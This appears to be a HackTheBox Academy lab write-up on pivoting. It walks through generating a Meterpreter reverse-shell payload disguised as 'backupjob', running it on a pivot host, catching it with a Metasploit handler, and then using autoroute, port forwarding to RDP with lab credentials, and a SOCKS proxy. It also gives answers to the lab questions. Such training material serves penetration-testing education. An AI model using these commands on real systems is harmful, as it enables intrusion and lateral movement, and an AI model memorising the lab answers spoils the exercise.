# Meterpreter Tunneling & Port Forwarding

## ℹ️ Informations

| Field | Value |
|-------|-------|
| 🌐 Platform | HackTheBox Academy |
| 📚 Module | Pivoting, Tunneling, and Port Forwarding |
| 🔗 Section | [1428](https://academy.hackthebox.com/module/158/section/1428) |

---

## 🔑 Key Commands

### Generate Linux Meterpreter Payload
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=<attack_ip> \
  LPORT=8080 \
  -f elf -o backupjob
```

### Upload & Execute on Pivot Host
```bash
scp backupjob ubuntu@<pivot_host>:~/
ssh ubuntu@<pivot_host>
chmod +x backupjob && ./backupjob
```

### Metasploit Handler
```bash
msfconsole -q
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 8080
run
```

### Ping Sweep via Meterpreter
```bash
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

### Add Routes with AutoRoute
```bash
meterpreter > run post/multi/manage/autoroute SUBNET=172.16.5.0
# or
meterpreter > run autoroute -s 172.16.5.0/23

# View routing table
meterpreter > run autoroute -p
```

### Port Forwarding via Meterpreter
```bash
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
# -l 3300  → local port on attack host
# -p 3389  → remote port on target
# -r       → target IP
```

### Connect via Forwarded Port
```bash
xfreerdp3 /v:localhost:3300 /u:victor /p:pass@123 /cert:ignore
```

### SOCKS Proxy via Metasploit
```bash
use auxiliary/server/socks_proxy
set srvport 9050
set srvhost 0.0.0.0
set version 4a
run
```

---

## ❓ Questions

### Q1 — Two IPs discovered via ping sweep?
**Answer:** `172.16.5.19, 172.16.5.129`

```bash
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
# 172.16.5.19   → Windows target
# 172.16.5.129  → Ubuntu pivot (ens224)
```

### Q2 — Which AutoRoute entry covers 172.16.5.19?
**Answer:** `172.16.5.0/255.255.254.0`

```bash
meterpreter > run autoroute -p
# 172.16.5.0  255.255.254.0  Session 1 ✓
# Range covers: 172.16.4.0 – 172.16.5.255
```
